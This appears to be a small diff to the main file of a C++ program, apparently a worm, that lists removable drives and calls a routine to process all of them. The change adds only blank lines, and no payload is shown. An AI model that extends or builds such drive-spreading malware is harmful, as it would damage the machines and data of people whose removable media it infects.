@@ -1,5 +1,7 @@
 #include "worm.h"
 
+
+
 int main() {
 	
 	setlocale(LC_ALL, "Russian");
@@ -11,6 +13,9 @@ int main() {
 	for (const auto& a1 : get_removable_volume_paths()) {
 		wcout << a1 << endl;
 	};
+	
+	
+	
 
 	worm1.process_all_removable_disks();
 
